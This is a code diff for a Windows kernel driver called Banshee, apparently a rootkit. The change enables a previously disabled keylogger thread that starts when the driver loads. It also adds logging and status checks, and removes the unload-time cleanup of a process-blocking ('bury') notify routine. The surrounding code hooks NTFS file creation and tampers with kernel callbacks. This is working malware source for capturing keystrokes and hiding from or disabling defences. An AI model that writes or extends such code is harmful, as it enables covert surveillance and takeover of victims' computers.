@@ -27,6 +27,8 @@ HANDLE hKeyloggerThread;
 NTSTATUS
 BeUnload(PDRIVER_OBJECT DriverObject)
 {
+    // TODO: call this from the client deliberately
+
     LOG_MSG("Unload Called \r\n");
 
     BeGlobals::shutdown = true;
@@ -68,34 +70,6 @@ BeUnload(PDRIVER_OBJECT DriverObject)
                 BeGlobals::beCallbacksToRestore.length--;
             }
         }
-    }
-
-    // Remove our bury routine if we set one
-    if(BeGlobals::beBuryTargetProcesses.length != 0)
-    {
-        if (BeGlobals::pPsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE) == STATUS_SUCCESS)
-        {
-            LOG_MSG("Removed routine!\n");
-        }
-        else
-        {
-            LOG_MSG("Failed to remove routine!\n");
-        }
-
-        // free global memory for bury process wstrs
-        { 
-            AutoLock<FastMutex> _lock(BeGlobals::buryLock); 
-            
-            while (BeGlobals::beBuryTargetProcesses.length >= 0)
-            {
-                if (BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length] != NULL)
-                {
-                    ExFreePoolWithTag(BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length], DRIVER_TAG);
-                    BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length] = NULL;
-                }
-                BeGlobals::beBuryTargetProcesses.length--;
-            }
-        } 
     }
 
     // Unhook if NTFS was hooked
@@ -165,6 +139,7 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NTSTATUS NtStatus = STATUS_SUCCESS;
     PDEVICE_OBJECT pDeviceObject = NULL;
 
+    LOG_MSG("Creating device\r\n");
     NtStatus = IoCreateDevice(
         pDriverObject,
         0,
@@ -175,17 +150,20 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
         &pDeviceObject
     );
 
-    if (pDeviceObject == NULL)
+    if (!NT_SUCCESS(NtStatus) || pDeviceObject == NULL)
     {
         return NtStatus;
     }
 
+    LOG_MSG("Creating symbolic link\r\n");
     NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDeviceName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
-    if (NtStatus != 0)
+    if (!NT_SUCCESS(NtStatus))
     {
         return NtStatus;
     }
 
+
+    LOG_MSG("Setting routines\r\n");
     pDriverObject->DriverUnload = (PDRIVER_UNLOAD)BeUnload;
 
     // IRP Major Requests
@@ -197,8 +175,9 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     pDriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)BeCreate;             // CreateFile
     pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)BeIoControl;  // DeviceIoControl
 
+    LOG_MSG("Init globals\r\n");
     NtStatus = BeGlobals::BeInitGlobals(pDriverObject);
-    if (NtStatus != 0)
+    if (!NT_SUCCESS(NtStatus))
     {
         return NtStatus;
     }
@@ -207,7 +186,6 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     NtStatus = BeHookNTFSFileCreate();
 #endif
 
-#ifdef notdefined
     // Start Keylogger Thread
     PKTHREAD ThreadObject;
     NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
@@ -215,8 +193,6 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     {
         return NtStatus;
     }
-
-#endif
 
     pDeviceObject->Flags |= DO_BUFFERED_IO;
     pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING; // finished initializing
